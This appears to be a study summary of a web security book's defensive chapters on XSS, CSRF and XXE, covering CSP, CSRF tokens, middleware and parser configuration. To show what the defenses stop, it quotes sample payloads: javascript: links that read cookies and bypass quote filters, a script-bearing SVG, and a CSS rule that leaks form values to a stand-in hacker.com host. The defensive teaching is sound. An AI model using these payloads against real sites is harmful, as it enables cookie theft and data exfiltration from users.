Overview — From Attack to Defense

In Part II of the book, we learned how to exploit web applications using XSS, CSRF, and XXE attacks. Now, in Part III, we shift perspective: the goal is to defend our codebase against these same attack classes. Each chapter provides concrete coding techniques, configuration changes, and architectural decisions that eliminate or dramatically reduce the attack surface.

💻
Ch.22 — XSS Defense
Sanitize DOM insertion, avoid dangerous APIs, encode entities, and deploy Content Security Policy (CSP).
🔒
Ch.23 — CSRF Defense
Verify headers, implement CSRF tokens, enforce stateless GET requests, and build anti-CSRF middleware.
📄
Ch.24 — XXE Defense
Disable external entities, evaluate alternative data formats (JSON), and understand advanced XXE escalation risks.

📋 Defense Is Always Multi-Layered

No single technique fully protects against any of these attack classes. Effective defense combines multiple strategies — coding best practices, input sanitization, token-based verification, and browser-level policies — so that if one layer is bypassed, others remain in place.

Ch.22 — Anti-XSS Coding Best Practices

The single most important rule for preventing XSS is: "Never allow any unsanitized user-supplied data to be passed into the DOM." Ideally, user data should only enter the DOM as plain text strings — never as HTML that the browser interprets as executable markup.

The Core Rule

❌ Avoid: innerHTML

innerHTML interprets HTML tags as actual DOM elements. If user input contains <script> or event-handler attributes, they execute as code.

✅ Prefer: innerText

innerText treats everything as a plain string. HTML tags are displayed as literal text, not rendered as DOM. This is significantly safer.

// ✗ UNSAFE — tags are interpreted as DOM const userString = '<strong>hello, world!</strong>'; const div = document.querySelector('#userComment'); div.innerHTML = userString; // <strong> renders as bold text // ✓ SAFE — tags are displayed as literal text div.innerText = userString; // shows "<strong>hello, world!</strong>" as text

Validating String-Like Objects

Before inserting any user data into the DOM, verify that it is a primitive string or number (a "string-like" value). Complex objects such as functions must be rejected.

// Check if a value is a simple string const isString = function(x) { if (typeof x === 'string' || x instanceof String) { return true; } return false; }; // Check if a value is "string-like" (string or number — safe for DOM) const isStringLike = function(x) { try { return JSON.stringify(JSON.parse(x)) === x; } catch (e) { console.log('not string-like'); } };

🔑 Default to Rejection

Allowing user-supplied data to populate the DOM should be a fallback, last-case option — not the first option. Whenever an alternative exists that does not require DOM injection, choose it instead.

🚿

Sanitizing User Input

Sometimes you cannot avoid injecting user data as HTML — for example, when a feature requires allowing certain tags (like <b> or <i>) but not others (like <script>). In these cases, extensive sanitization is required before any data reaches the DOM.

📖 From the Book — Bypassing Simple Filters

Assume your sanitizer blocks single and double quotes as well as <script> tags. An attacker can still execute code using the JavaScript pseudo-scheme:

<!-- No script tags, no quotes — but still executes JavaScript --> <a href="javascript:alert(document.cookie)">click me</a> <!-- Even bypasses quote filtering using String.fromCharCode() --> <a href="javascript:alert(String.fromCharCode(88,83,83))">click me</a> <!-- Alerts "XSS" without any quotes in the payload -->

⚠️ Sanitization Is Extremely Hard

The DOM specification is vast and complex. Any API that converts text to DOM or text to script is a potential XSS vector. Complete sanitization is nearly impossible to achieve with a home-brewed solution — always prefer well-tested, maintained libraries and browser-native protections.

Sanitizing Hyperlinks

When user input is used in navigation URLs, leverage the browser's built-in <a> tag sanitization rather than building your own filter:

// ✓ Use a dummy <a> tag to take advantage of browser sanitization const userLink = "<script>alert('hi')</script>"; const goToLink = function() { const dummy = document.createElement('a'); dummy.href = userLink; window.location.href = `https://mywebsite.com/${dummy.href}`; // Browser encodes tags: %3Cscript%3Ealert(...)%3C%2Fscript%3E };

You can also use encodeURIComponent() for encoding individual URI segments. While theoretically escapable, these browser-native functions are vastly better tested than any custom solution.

⚠️

Dangerous DOM API Sinks

A sink is any API that converts text into executable DOM or script. The following APIs are the most common XSS sinks — avoid them whenever possible, and sanitize rigorously when they must be used:

API Risk Safer Alternative
element.innerHTML / outerHTML Interprets HTML tags as DOM — direct XSS sink Use innerText or document.createElement()
DOMParser.parseFromString() Converts a string into a full DOM tree — script tags execute Build DOM nodes manually with createElement() + appendChild()
SVG XML-based format that supports <script> tags and onload handlers Sanitize or reject user-uploaded SVGs; prefer raster formats (PNG, JPG)
Blob + createObjectURL() Can store arbitrary data including executable scripts, then inject them via script.src Avoid Blob when any part of the instantiation involves user data
document.write() / writeln() Writes raw HTML directly into the document stream Never use in modern applications; build DOM with standard APIs
📖 From the Book — SVG Script Execution

SVG files are XML-based, which means they support embedded <script> tags. An uploaded SVG file can execute arbitrary JavaScript when loaded into the page — making SVGs significantly more dangerous than raster image formats:

<svg version="1.1" xmlns="http://www.w3.org/2000/svg"> <circle cx="250" cy="250" r="50" fill="red" /> <script type="text/javascript">console.log('test');</script> </svg>

🔑 The Rule of Thumb

Any API that converts text to DOM or text to script is a potential XSS attack vector. Prefer APIs that give you explicit control over element creation (createElement, appendChild) over APIs that interpret strings as markup.

🔢

HTML Entity Encoding

Entity encoding converts potentially dangerous characters into their HTML entity equivalents. The encoded characters are displayed correctly in the browser but cannot be interpreted as code.

The "Big Five" Characters

Character Entity Encoded Why It Matters
& &amp; Starts entity sequences — must be escaped to prevent injection of other entities
< &lt; Opens HTML tags — the primary character used to start <script> and other dangerous elements
> &gt; Closes HTML tags
" &#034; Breaks out of attribute values in double-quoted contexts
' &#039; Breaks out of attribute values in single-quoted contexts

⚠️ Entity Encoding Has Limits

Entity encoding only protects content injected into HTML body elements (like <div> or <p>). It does NOT protect content injected inside <script> tags, CSS, or URLs — because valid JavaScript can be constructed from sequences of entity-encoded characters in those contexts.

🎨

CSS as an Attack Vector

CSS is typically considered a "display-only" technology, but its specification is powerful enough to be used as a data exfiltration channel. If your application allows users to upload custom stylesheets, attackers can use CSS to leak form data to external servers.

📖 From the Book — CSS Data Exfiltration

CSS allows selective styling based on form field values. Combined with background:url(), an attacker can trigger HTTP GET requests that leak form data to a remote server — without any JavaScript at all:

/* When the income field is set to ">100k", CSS triggers a GET request */ #income[value=">100k"] { background: url("https://www.hacker.com/incomes?amount=gte100k"); } /* The form value is leaked to the attacker's server via the URL */

Three Levels of CSS Defense

Difficulty Defense
Easy Disallow user-uploaded CSS entirely — the simplest and most effective solution
Medium Allow users to modify only specific, safe fields — then generate the stylesheet yourself on the server using those fields
Hard Sanitize any HTTP-initiating CSS attributes (background:url, @import, etc.) — extremely difficult to do comprehensively
🛡

Content Security Policy (CSP)

The Content Security Policy is a browser-level security configuration that restricts what code can execute inside your application. CSP is supported by all major browsers and provides a powerful first layer of defense against XSS.

Script Source (script-src)

CSP allows you to whitelist specific URLs from which scripts are allowed to load. Any script from an unlisted origin is blocked and the browser throws a CSP violation error.

/* CSP header — only allow scripts from your own domain and your API */ Content-Security-Policy: script-src "self" https://api.mega-bank.com /* Attempting to load a script from https://www.hacker.com → BLOCKED */ /* Attempting to load a script from https://api2.mega-bank.com → BLOCKED */

⚠️ Avoid Wildcard CSP Whitelists

Whitelisting https://*.mega-bank.com may seem convenient, but if any subdomain later allows user-uploaded content (e.g., hosting.mega-bank.com), an attacker can host malicious scripts on that subdomain and bypass your CSP entirely. Always whitelist specific origins.

Unsafe Eval & Unsafe Inline

When CSP is enabled, two dangerous capabilities are disabled by default:

unsafe-inline

Allows inline <script> tags and inline event handlers. Disabled by default when CSP is active. Re-enabling it significantly weakens XSS protection.

unsafe-eval

Allows eval() and similar string-to-code functions. Disabled by default when CSP is active. If your code uses eval, rewrite it to avoid string interpretation.

📖 From the Book — Rewriting eval-Style Code

Code that passes strings to functions like setTimeout can often be rewritten to avoid string interpretation entirely:

// ✗ UNSAFE — string is interpreted as code (requires unsafe-eval) const startTimer = function(minutes, message) { setTimeout(`window.alert(${message});`, minutes * 60 * 1000); }; // ✓ SAFE — function reference, no string interpretation needed const startTimer = function(minutes, message) { setTimeout(function() { alert(message); }, minutes * 60 * 1000); };

How to Implement CSP

  1. 1
    HTTP Header (Recommended)
    Have your server send a Content-Security-Policy header with every response. The header value is the policy string itself.
  2. 2
    HTML Meta Tag (Alternative)
    Embed a <meta http-equiv="Content-Security-Policy" content="..."> tag in your HTML <head>. Less flexible than the header approach but useful when you cannot control server headers.

🔑 CSP Does Not Protect Against DOM XSS

CSP is a strong first measure against reflected and stored XSS, but it does not protect against DOM-based XSS — where the vulnerability exists entirely in client-side JavaScript. A comprehensive defense combines CSP with the coding best practices described earlier in this chapter.

Ch.23 — Header Verification

Many CSRF attacks originate from a different website than the target. Because of this, we can use HTTP headers to verify the origin of each request as a first line of defense.

Two Headers to Check

Origin Header

Sent on HTTP POST requests. Indicates where the request originated. Present on both HTTP and HTTPS. Cannot be modified programmatically by JavaScript in major browsers.

Referer Header

Sent on all requests (unless rel=noreferer is set). Also indicates request origin. Should be checked alongside the Origin header for defense in depth.

const validLocations = [ 'https://www.mega-bank.com', 'https://api.mega-bank.com', 'https://portal.mega-bank.com' ]; const validateHeadersAgainstCSRF = function(headers) { const origin = headers.origin; const referer = headers.referer; if (!origin || !referer) { return false; } if (!validLocations.includes(origin) || !validLocations.includes(referer)) { return false; } return true; };

💡 Header Verification Is a Starting Point

If an attacker achieves XSS on one of your whitelisted origins, they can initiate CSRF attacks that appear to come from your own servers — bypassing header verification entirely. This is why header verification should always be combined with CSRF tokens and other defenses.

🔑

CSRF Tokens — The Primary Defense

The most powerful and widely used defense against CSRF is the anti-CSRF token. Most major websites rely on CSRF tokens as their primary CSRF defense.

How CSRF Tokens Work

  1. 1
    Server generates a unique token
    The token is cryptographically generated with a very low collision probability. It is typically generated once per session (though it can be regenerated per request for higher security).
  2. 2
    Client sends the token with every request
    The token is included in both form submissions and AJAX requests. On the server side, the token is verified to ensure it is live (not expired), authentic, and unmodified. If verification fails, the request is logged and rejected.
  3. 3
    Attackers cannot forge the token
    Since each token is unique per session and per user, an attacker on a different origin cannot obtain a valid token. They would need to target a specific user and possess their current, unexpired token — a dramatically harder attack.

Stateless CSRF Tokens

Modern web applications often use stateless (REST) APIs. CSRF tokens can be implemented without server-side session storage by combining three components:

  • User identifier — uniquely ties the token to its owner
  • Timestamp — enables token expiration (e.g., 1 week)
  • Cryptographic nonce — signed with a server-side secret key to prevent forgery

🔒 Stateless Tokens Scale Better

Stateless CSRF tokens consume fewer server resources than session-managed tokens because they do not require the server to track active sessions. The server validates the token using its secret key at request time — no database lookup needed.

🚫

Stateless GET Requests — The Foundational Rule

The single most common and easily exploitable CSRF attack vector is an HTTP GET request that modifies server-side state. The fix is an absolute design rule: HTTP GET requests must never store or modify any server-side state.

❌ Vulnerable: GET That Modifies State

A single GET endpoint that both retrieves and optionally updates a user. An attacker can craft a link like GET /user?id=123&updates=email:hacker to modify the user's email through a simple link click.

✅ Safe: Separate GET and POST

Split into a GET endpoint (read only) and a POST endpoint (writes). The GET can never modify state, and the POST is not vulnerable to link-based or image-based CSRF attacks.

// ✗ VULNERABLE — GET request modifies state const user = function(req, res) { getUserById(req.query.id).then(function(user) { if (req.query.updates) { user.update(req.updates); } // state change in GET! return res.json(user); }); }; // ✓ SAFE — read and write are separate endpoints const getUser = function(req, res) { // GET — read only getUserById(req.query.id).then(function(user) { return res.json(user); }); }; const updateUser = function(req, res) { // POST — writes getUserById(req.query.id).then(function(user) { user.update(req.updates).then(function(updated) { if (!updated) { return res.sendStatus(400); } return res.sendStatus(200); }); }); };

🔑 The Nature of the Web Makes GET Dangerous

Links, images, stylesheets, and iframes all trigger HTTP GET requests automatically. This makes GET inherently more exposed to CSRF than POST. By ensuring GET requests are always read-only, you eliminate the entire class of link-based and image-based CSRF attacks.

🛠

Application-Wide Anti-CSRF Middleware

CSRF defenses are only effective when applied application-wide. A single unprotected endpoint breaks the entire chain. Modern web server stacks support middleware — code that runs on every request before any route logic executes.

const crypto = require('../util/crypto'); const dateTime = require('../util/dateTime'); const session = require('../util/session'); const logger = require('../util/logger'); const validateCSRFToken = function(token, user) { const text_token = crypto.decrypt(token); const user_id = text_token.split(':')[0]; const date = text_token.split(':')[1]; const nonce = text_token.split(':')[2]; let validUser = (user_id === user.id); let validDate = dateTime.lessThan(1, 'week', date); let validNonce = crypto.validateNonce(user_id, date, nonce); return validUser && validDate && validNonce; }; const CSRFShield = function(req, res, next) { if (!validateHeaders(req.headers, req.method) || !validateCSRFToken(req.csrf, session.currentUser)) { logger.log(req); // log the failed attempt return res.sendStatus(401); // reject before any logic runs } return next(); // pass to route handler };

This middleware combines both header verification and CSRF token validation into a single check that runs before any route logic. It rejects invalid requests with a 401 status and logs the attempt for monitoring.

🛠 Automate on the Client Too

Since the middleware requires a CSRF token on every request, automate token attachment on the client side as well. You can use the proxy pattern to override XMLHttpRequest to always include the token, or build a request library wrapper that injects the correct token based on the HTTP method.

Ch.24 — Disabling External Entities

The primary defense against XXE is remarkably simple: disable external entity processing in your XML parser. This is typically a single line of configuration.

// Java — disable DOCTYPE declarations (which enable external entities) factory.setFeature( "http://apache.org/xml/features/disallow-doctype-decl", true );

⚠️ Java XML Parsers Are Especially Risky

OWASP specifically warns that many Java-based XML parsers have external entities enabled by default. Depending on the language and parser, the default may vary — always check your parser's documentation explicitly. Never assume external entities are disabled.

🔑 One Line of Configuration

XXE is one of the easiest vulnerabilities to fix and one of the most dangerous to leave unfixed. Always verify your XML parser configuration before deploying any application that processes XML or XML-derived formats (including SVG).

🔄

Evaluating Alternative Data Formats — XML vs JSON

If your application uses XML only for structured data payloads (not for rendering or schema validation), switching to JSON eliminates XXE risk entirely. JSON stores key/value pairs in a string-based format and has no mechanism for referencing external files.

Category XML JSON
Payload Size Large Compact
Specification Complexity High Low
Ease of Use Requires complex parsing Simple — maps directly to JavaScript objects
Metadata Support Yes (attributes) No
Schema Validation Supported (XSD) Not built-in
Rendering (HTML-like) Easy (XML is DOM-like) Difficult
Readability Low High
Security Lower (external entities, DTDs) Higher (no code execution mechanism)

When to Use Which

Use JSON When...

Your API sends structured data to be interpreted by JavaScript. JSON is lighter, simpler, and inherently safer. It is the default choice for modern REST APIs.

Keep XML When...

Your application processes actual XML documents, SVG files, or requires strict schema validation with XSD. In these cases, disable external entities and validate rigorously.

💡 Other Alternatives

If JSON is not suitable, YAML, BSON, and EDN are all viable alternatives — but each should undergo a similar security analysis before adoption.

⚠️

Advanced XXE Risks — Escalation

XXE attacks often begin as read-only data access — the attacker reads files from the server's filesystem via external entity references. However, this initial access frequently serves as a gateway to more severe attacks.

📖 From the Book — XXE as a Gateway Attack

XXE provides the attacker with a recon platform that permits them to access data otherwise inaccessible from outside the web server. Using this data — configuration files, credentials, internal network addresses — other parts of the application may be more easily compromised.

XXE Escalation Path

  1. 1
    Read-only file access
    The attacker reads sensitive files — /etc/passwd, application config files, database credentials, API keys.
  2. 2
    Internal network scanning
    Using XXE to make requests to internal IP addresses, the attacker maps the internal network topology and discovers other services.
  3. 3
    Remote code execution
    With stolen credentials and internal network knowledge, the attacker can potentially achieve full server takeover — far beyond the initial "read-only" XXE entry point.

⚠️ Never Underestimate XXE

The final impact of an XXE attack can range from simple data disclosure to complete remote code execution and full server takeover. This escalation potential is why XXE is rated as one of the most dangerous web application vulnerabilities — and why it must be addressed even when the immediate impact appears limited to file reads.
